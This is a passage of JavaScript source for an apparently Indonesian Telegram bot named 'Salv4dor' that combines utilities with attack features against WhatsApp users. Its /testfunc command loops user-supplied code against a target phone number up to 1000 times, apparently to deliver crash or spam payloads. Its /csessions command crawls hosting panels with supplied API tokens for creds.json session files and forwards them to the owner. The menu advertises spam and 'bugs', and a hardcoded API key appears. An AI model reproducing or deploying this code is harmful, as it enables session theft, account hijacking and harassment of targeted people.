      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("iqc", checkPremium, async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
  const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

  if (!input || !batteryInput) {
    return ctx.reply(
      "❌ Incorrect format.\n\nExample:\n/iqc Salv4dor1,100",
      { parse_mode: "Markdown" }
    );
  }

  const battery = parseInt(batteryInput);
  if (isNaN(battery) || battery < 0 || battery > 100) {
    return ctx.reply("❌ Battery must be a number between 0–100.", {
      parse_mode: "Markdown",
    });
  }

  const hours = Math.floor(Math.random() * 24)
    .toString()
    .padStart(2, "0");
  const minutes = Math.floor(Math.random() * 60)
    .toString()
    .padStart(2, "0");
  const time = `${hours}:${minutes}`;

  const carriers = [
    "TELKOMSEL",
    "INDOSAT OOREDOO",
    "XL AXIATA",
    "SMARTFREN",
    "IM3 (THREE)",
    "BY.U",
  ];
  const carrier = carriers[Math.floor(Math.random() * carriers.length)];
  const signalStrength = Math.floor(Math.random() * 4) + 1;

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;

  try {
    await ctx.replyWithChatAction("upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Channel Information", url: "https://t.me/Xatanchiixxiv" }],
          ],
        },
      }
    );
  } catch (err) {
    console.error(err.message);
    ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");
  }
});

bot.command('tourl', async (ctx) => {
    try {
        const reply = ctx.message.reply_to_message;
        if (!reply) {
            return ctx.reply('❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl');
        }

        let fileId = null;
        let fileName = 'file';

        if (reply.photo) {
            fileId = reply.photo[reply.photo.length - 1].file_id;
            fileName = 'photo.jpg';
        } else if (reply.video) {
            fileId = reply.video.file_id;
            fileName = reply.video.file_name || 'video.mp4';
        } else if (reply.audio) {
            fileId = reply.audio.file_id;
            fileName = reply.audio.file_name || 'audio.mp3';
        } else if (reply.document) {
            fileId = reply.document.file_id;
            fileName = reply.document.file_name || 'document.pdf';
        } else if (reply.sticker) {
            fileId = reply.sticker.file_id;
            fileName = 'sticker.webp';
        } else if (reply.animation) {
            fileId = reply.animation.file_id;
            fileName = 'animation.gif';
        } else if (reply.voice) {
            fileId = reply.voice.file_id;
            fileName = 'voice.ogg';
        } else {
            return ctx.reply('❌ Format file tidak didukung.');
        }

        const fileLink = await ctx.telegram.getFileLink(fileId);
        
        const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data);

        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', buffer, {
            filename: fileName,
            contentType: 'application/octet-stream'
        });

        const uploadRes = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        const url = uploadRes.data;
        
        await ctx.reply(url);
        
    } catch (error) {
        console.error('❌ Gagal tourl:', error.message);
        await ctx.reply('❌ Gagal mengupload file.');
    }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

// ===== TES FUNCTION =====
bot.command("testfunc", checkPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const text = ctx.message?.text || "";
    const args = text.split(" ");

    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunc 62xxx 10 (reply your function)");
    }

    const q = args[1];
    let jumlah = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah)) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message?.text) {
      return ctx.reply("❌ Reply dengan function");
    }

    const photoUrl = "https://files.catbox.moe/5ipstj.jpg";

    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `
\`\`\`js
⎔ 𝗦𝗔𝗟𝗩𝗔𝗗𝗢𝗥 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡 𝗧𝗘𝗦𝗧𝗜𝗡𝗚
━━━━━━━━━━━━━━⪼
‎↯  Target  :: ${q}
‎↯  Type    :: Unknown Function
‎↯  Status  :: ▓▒░ Processing...
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☇ Check", url: `https://wa.me/${q}`, style: "danger" }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return ctx.reply("❌ Function harus async function");
    }

    const funcName = matchFunc[1];

    const vm = require("vm");

    const safeSock = createSafeSock(global.sock || sock);

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      require
    };

    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;

        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) {
        console.log("Loop error:", e.message);
      }

      await new Promise(r => setTimeout(r, 200));
    }

    const finalText = `
\`\`\`js
⎔ 𝗦𝗔𝗟𝗩𝗔𝗗𝗢𝗥 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡 𝗧𝗘𝗦𝗧𝗜𝗡𝗚
━━━━━━━━━━━━━━⪼
‎↯  Target  :: ${q}
‎↯  Type    :: Unknown Function
‎↯  Status  :: ✅ Success...
\`\`\``;

    try {
      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "☇ Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      );
    } catch {
      await ctx.replyWithPhoto(photoUrl, {
        caption: finalText,
        parse_mode: "Markdown"
      });
    }

  } catch (err) {
    console.error("ERROR:", err);
    ctx.reply("❌ Terjadi error");
  }
});

// ===== CEK FUNCTION =====
bot.command('cekfunc', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const replyToMessage = ctx.message.reply_to_message;

        if (!replyToMessage || !replyToMessage.text) {
            return ctx.reply("❌ Reply kode JS lalu ketik /cekfunc");
        }

        const code = replyToMessage.text;
        const wrappedCode = `(async () => { ${code} })();`;

        try {
            new vm.Script(wrappedCode);
            return ctx.reply(
                "✅ Syntax valid! Tidak ada error\n© Created By Salv4dor",
                { parse_mode: "Markdown" }
            );
        } catch (err) {
            return ctx.reply(
                `❌ Syntax Error:\n${err.message}`,
                { parse_mode: "Markdown" }
            );
        }

    } catch (error) {
        console.error('❌ Error cekfunc:', error.message);
        await ctx.reply(`❌ Error: ${error.message}`);
    }
});

// ============================================
// COMMAND TRACKWEB
// ============================================
bot.command("trackweb", async ctx => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    const replyId = ctx.message.message_id;

    if (!input) {
        return ctx.reply(
            "⚠️ *Masukkan URL Website*\n\nContoh:\n`/trackweb https://example.com`",
            { reply_to_message_id: replyId, parse_mode: "Markdown" }
        );
    }

    let url;
    try {
        url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
    } catch {
        return ctx.reply("❌ URL tidak valid.", { reply_to_message_id: replyId });
    }

    const msg = await ctx.reply("⏳ Sedang melacak...");

    try {
        const dnsResult = await dnsLookup(url.hostname);
        const res = await axios.get(url.href, { timeout: 10000, validateStatus: () => true });
        const h = res.headers;

        const caption = 
`🌐 *TRACKING WEBSITE*

📌 URL: ${url.href}
📊 Status: ${res.status}

🌍 DNS Info:
├ IP: ${dnsResult.address}
└ Family: IPv${dnsResult.family}

🖥 Server:
├ Server: ${h["server"] || "Unknown"}
├ Powered: ${h["x-powered-by"] || "-"}
└ Cloudflare: ${h["cf-ray"] ? "✅ Yes" : "❌ No"}

🔐 Security:
├ HTTPS: ${url.protocol === "https:" ? "✅ Enabled" : "❌ Disabled"}
├ CSP: ${h["content-security-policy"] ? "✅ Yes" : "❌ No"}
└ HSTS: ${h["strict-transport-security"] ? "✅ Yes" : "❌ No"}

📊 Headers:
├ Content-Type: ${h["content-type"] || "-"}
└ Content-Length: ${h["content-length"] ? (parseInt(h["content-length"]) / 1024).toFixed(2) + " KB" : "-"}`;

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, caption, { parse_mode: "Markdown" });

    } catch {
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, "❌ Gagal melacak website!");
    }
});

// ============================================
// COMMAND STATUSWEB
// ============================================
bot.command("statusweb", async ctx => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    const replyId = ctx.message.message_id;

    if (!input) {
        return ctx.reply(
            "❌ Masukkan URL!\n\nContoh: /statusweb https://example.com",
            { reply_to_message_id: replyId }
        );
    }

    let target = input;
    if (!/^https?:\/\//i.test(target)) target = "http://" + target;

    const msg = await ctx.reply("🔍 Mengecek status...");

    try {
        const start = Date.now();
        const res = await axios.get(target, { timeout: 8000, validateStatus: () => true });
        const ping = Date.now() - start;

        let icon = "🟢";
        let status = "ONLINE";
        if (res.status >= 400 && res.status < 500) { icon = "🟠"; status = "ERROR (Client)"; }
        else if (res.status >= 500) { icon = "🔴"; status = "ERROR (Server)"; }

        const caption = 
`🌐 *STATUS WEBSITE*

${icon} Status: ${status}
├ HTTP Code: ${res.status}
├ Response: ${ping} ms
└ URL: ${target}`;

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, caption, { parse_mode: "Markdown" });

    } catch {
        const caption = 
`🌐 *STATUS WEBSITE*

🔴 Status: DOWN
├ Response: Timeout
└ URL: ${target}

❌ Website tidak dapat diakses`;

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, caption, { parse_mode: "Markdown" });
    }
});

bot.command("cekid", async ctx => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === USERNAME @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Format Salah!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ Tidak bisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User ===
  if (!target.username) {
    return ctx.reply(
      `❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
    `✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async ctx => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 ☇ Format: /cekbio 62×××");
  }

  const q = args[1];
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
    caption: `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary" }],
      ],
    },
  });

  try {
    const contact = await sock.onWhatsApp(target);

    if (!contact || contact.length === 0) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMsg.message_id,
        undefined,
        `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp
\`\`\``,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📱 ☇ Target",
                  url: `https://wa.me/${q}`,
                  style: "primary",
                },
              ],
            ],
          },
        }
      );
      return;
    }

    const contactDetails = await sock.fetchStatus(target).catch(() => null);
    const profilePicture = await sock
      .profilePictureUrl(target, "image")
      .catch(() => null);

    const bio = contactDetails?.status || "Tidak ada bio";
    const lastSeen = contactDetails?.lastSeen
      ? moment(contactDetails.lastSeen)
          .tz("Asia/Jakarta")
          .format("DD-MM-YYYY HH:mm:ss")
      : "Tidak tersedia";

    const caption = `\`\`\`js
⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡
Nomor: ${q}
Status WhatsApp: ✅ Terdaftar
Bio: ${bio}
Terakhir Dilihat: ${lastSeen}
${profilePicture ? "Profile Picture: ✅ Tersedia" : "Profile Picture: ❌ Tidak tersedia"}

<i>Diperiksa pada: ${moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss")}</i>
\`\`\``;

    // Jika ada profile picture, kirim bersama foto profil
    if (profilePicture) {
      await ctx.replyWithPhoto(profilePicture, {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 Chat Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      });
    } else {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 Chat Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      });
    }

    await ctx.deleteMessage(processMsg.message_id);
  } catch (error) {
    console.error("Error checking bio:", error);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMsg.message_id,
      undefined,
      `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📱 ☇ Target",
                url: `https://wa.me/${q}`,
                style: "primary",
              },
            ],
          ],
        },
      }
    );
  }
});

// =================== SPOTIFY ===================
bot.command('spotify', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const query = ctx.message.text.split(' ').slice(1).join(' ');

        if (!query) {
            return ctx.reply('/spotify judul lagu');
        }

        const loading = await ctx.reply('Mencari lagu...');

        const { data } = await axios.get(
            `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`
        );

        if (!data?.status || !data?.result) {
            return ctx.telegram.editMessageText(
                chatId,
                loading.message_id,
                null,
                'Lagu tidak ditemukan.'
            );
        }

        const result = data.result;

        await ctx.telegram.editMessageText(
            chatId,
            loading.message_id,
            null,
            'Mengirim audio...'
        );

        const formatDuration = (sec) => {
            const m = Math.floor(sec / 60);
            const s = String(sec % 60).padStart(2, "0");
            return `${m}:${s}`;
        };

        const caption = "```js\n" +
"Title: " + result.title + "\n" +
"Artist: " + (result.author || "Unknown") + "\n" +
"Duration: " + formatDuration(result.duration) + "\n" +
"```";

        await ctx.replyWithAudio(result.audio.url, {
            title: result.title,
            performer: result.author || "Unknown Artist",
            caption: caption,
            parse_mode: "Markdown"
        });

        await ctx.deleteMessage(loading.message_id);

    } catch (error) {
        console.error('Error spotify:', error.message);
        await ctx.reply('Terjadi kesalahan.');
    }
});

// =================== /carisesi ===================
bot.command("csessions", checkPremium, async ctx => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios
        .get(`${base}/api/application/servers`, {
          params: { page },
          headers: commonHeadersApp,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const chunk =
        r && r.data && Array.isArray(r.data.data) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(
        r &&
        r.data &&
        r.data.meta &&
        r.data.meta.pagination &&
        r.data.meta.pagination.links &&
        r.data.meta.pagination.links.next
      );
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios
        .get(`${base}/api/client/servers/${identifier}/files/list`, {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        })
        .catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name =
          (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if (
          (lower === "session" || lower === "sessions") &&
          isDirectory(item)
        ) {
          try {
            const sessRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/list`, {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName =
                  (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath =
                  (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(
              identifier,
              normalized === "" ? "/" : normalized
            );
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(
            /\/+$/,
            ""
          );

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios
              .get(`${base}/api/client/servers/${identifier}/files/download`, {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              })
              .catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(
              `Gagal download ${filePath} dari ${name}:`,
              e?.message || e
            );
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply(
        "✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun"
      );
    } else {
      return ctx.reply(
        `✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`
      );
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = ms => new Promise(res => setTimeout(res, ms));
const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

//AUTO — UPDATE

bot.command("pullupdate", async ctx => {
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Fitur ini hanya dapat digunakan oleh owner.");
  }

  await ctx.reply("⏳ Mengunduh dan memvalidasi update terbaru...");
  try {
    await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);
    const stat = fs.statSync(UPDATE_TEMP_PATH);
    if (stat.size < 100) throw new Error("FILE_UPDATE_KOSONG_ATAU_TIDAK_VALID");

    const syntaxCheck = spawnSync(process.execPath, ["--check", UPDATE_TEMP_PATH], { encoding: "utf8" });
    if (syntaxCheck.status !== 0) {
      throw new Error(`SYNTAX_UPDATE_INVALID: ${String(syntaxCheck.stderr || "").trim()}`);
    }

    fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
    fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);
    await ctx.reply("✅ UPDATE BERHASIL /n Version : 2.0.");
    setTimeout(() => process.exit(0), 2000);
  } catch (error) {
    fs.rmSync(UPDATE_TEMP_PATH, { force: true });
    console.error("Auto-update gagal:", error);
    await ctx.reply(`❌ UPDATE GAGAL TIDAK ADA FILE UNTUK MENGUPDATE FILE | MOHON UNTUK MELIHAT INFORMATION DARI DEVELOPER : ${String(error.message || error).slice(0, 400)}`);

  }
});

//============ JOIN CHANNEL =======\\
const joinedUsers = new Set();

function addJoinedUser(userId, username = null, firstName = null) {
    if (joinedUsers.has(userId)) return false;
    
    joinedUsers.add(userId);
    return true;
}

function isUserJoined(userId) {
    return joinedUsers.has(userId);
}

async function checkJoin(ctx) {
    try {
        const userId = ctx.from.id;
        
        if (isUserJoined(userId)) {
            return true;
        }
        
        const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
        const status = ["member", "administrator", "creator"].includes(member.status);
        
        if (status) {
            addJoinedUser(userId);
        }
        
        return status;
    } catch (err) {
        console.log("CHECK JOIN ERROR:", err.message);
        return false;
    }
}

async function refreshJoin(ctx) {
    try {
        const userId = ctx.from.id;
        
        joinedUsers.delete(userId);
        
        const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
        const status = ["member", "administrator", "creator"].includes(member.status);
        
        if (status) {
            addJoinedUser(userId);
        }
        
        return status;
    } catch (err) {
        console.log("REFRESH JOIN ERROR:", err.message);
        return false;
    }
}

const notifiedUsers = new Map();

bot.use(async (ctx, next) => {
    try {
        if (!ctx.from) return next();

        const text = ctx.message?.text;
        if (!text) return next();

        if (!text.startsWith("/")) return next();

        const userId = ctx.from.id;
        const joined = await checkJoin(ctx);

        if (!joined) {
            const lastNotif = notifiedUsers.get(userId);
            if (lastNotif && Date.now() - lastNotif < 30000) {
                return;
            }

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: `<blockquote><strong>( <tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> ) Kamu wajib join channel dulu sebelum menggunakan bot ini.</strong></blockquote>`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "「 λ Join Channel λ 」",
                                url: `https://t.me/${CHANNEL_USERNAME}`,
                                style: "primary"
                            },
                        ],
                        [
                            {
                                text: "「 λ Check Join λ 」",
                                callback_data: "check_join",
                                style: "primary"
                            }
                        ]
                    ],
                }
            });

            notifiedUsers.set(userId, Date.now());
            setTimeout(() => {
                notifiedUsers.delete(userId);
            }, 300000);

            return;
        }

        if (notifiedUsers.has(userId)) {
            notifiedUsers.delete(userId);
        }

        return next();
    } catch (e) {
        console.log("MIDDLEWARE JOIN ERROR:", e.message);
        return ctx.replyWithPhoto(thumbnailUrl, {
            caption: "❌ Terjadi error saat cek akses channel."
        });
    }
});

bot.action('check_join', async (ctx) => {
    try {
        await ctx.answerCbQuery('⏳ Mengecek...').catch(() => {});

        const userId = ctx.from.id;
        const joined = await refreshJoin(ctx);

        if (joined) {
            if (notifiedUsers.has(userId)) {
                notifiedUsers.delete(userId);
            }

            await ctx.deleteMessage();

            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> *Akses Diberikan!*\nKamu sudah join channel. Sekarang kamu bisa menggunakan semua perintah bot.\n\nKetik /start untuk memulai.',
                parse_mode: 'Markdown'
            });
        } else {
            await ctx.answerCbQuery('<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Kamu belum join channel! Silakan join dulu.', { show_alert: true });
        }
    } catch (e) {
        console.log("CHECK JOIN CALLBACK ERROR:", e.message);
        try {
            await ctx.answerCbQuery('<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> Terjadi error, coba lagi nanti.');
        } catch (err) {}
    }
});

//============( MENU UTAMA ) =======\\

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});

const userFirstStart = new Set();

bot.start(async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);

    const progressMsg = await ctx.reply('<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> Loading Script...', {
        parse_mode: "HTML",
    });

    const steps = [
        { text: '<tg-emoji emoji-id="6206446249181189526">✨</tg-emoji> 𝖢𝗁𝖾𝖼𝗄𝗂𝗇𝗀 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇...', delay: 800 },
        { text: '<tg-emoji emoji-id="5463345378587849154">✨</tg-emoji> 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗈𝗇 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆...', delay: 600 },
        { text: '<tg-emoji emoji-id="5307843983102204243">✨</tg-emoji> 𝖵𝖺𝗅𝗂𝖽𝖺𝗍𝗂𝗇𝗀 𝖳𝗈𝗄𝖾𝗇 𝖡𝗈𝗍𝗌...', delay: 800 },
        { text: '<tg-emoji emoji-id="6206479140040743133">✨</tg-emoji> 𝖳𝗈𝗄𝖾𝗇 𝖡𝗈𝗍 𝖵𝖺𝗅𝗂𝖽!', delay: 500 },
        { text: '<tg-emoji emoji-id="6206343625232619150">✨</tg-emoji> 𝖫𝗈𝖺𝖽𝗂𝗇𝗀 𝖣𝖺𝗍𝖺...', delay: 700 },
        { text: '<tg-emoji emoji-id="6206118633370818254">✨</tg-emoji> 𝖫𝗈𝖺𝖽𝗂𝗇𝗀 𝖬𝖾𝗇𝗎...', delay: 500 },
    ];
    
    for (const step of steps) {
        await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            null,
            step.text,
            { parse_mode: "HTML" }
        );
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }
    
    await ctx.deleteMessage(progressMsg.message_id);
}

    const username = ctx.from.username || ctx.from.first_name || 'Tidak Diketahui';
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const senderStatus = isWhatsAppConnected ? 
    "✔️ Connected" : "❌ Disconnected";
    
    const menuMessage = `
<blockquote><strong><tg-emoji emoji-id="6028575719125159808">🎆</tg-emoji> S ᗩ ᒪ ᐯ 4 ᗪ O ᖇ <tg-emoji emoji-id="5897561886404120587">🌛</tg-emoji></strong></blockquote>
<tg-emoji emoji-id="5769547529993588669">👑</tg-emoji> Developer : @parkyoujoung
<tg-emoji emoji-id="6030579106620378674">🌐</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="5382357040008021292">🆕</tg-emoji> Version : 1.0 [ New Release ]
<tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> Type Script : Free Spam & Not Spam
<blockquote><strong>☰ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭</strong></blockquote>
☇ ID : ${userId}
☇ Username : ${username}
<blockquote><strong>☰ 𝖲𝖳𝖠𝖳𝖴𝖲</strong></blockquote>
☇ Connection : ${senderStatus}
☇ Runtime : ${runtimeStatus}
`;

  const keyboard = [
    [
      {
        text: "「 λ 𝖷—𝖡𝖴𝖦𝖲 λ 」",
        callback_data: "/bug",
        style: "primary",
        icon_custom_emoji_id:'5987813726412083870'
      },
      {
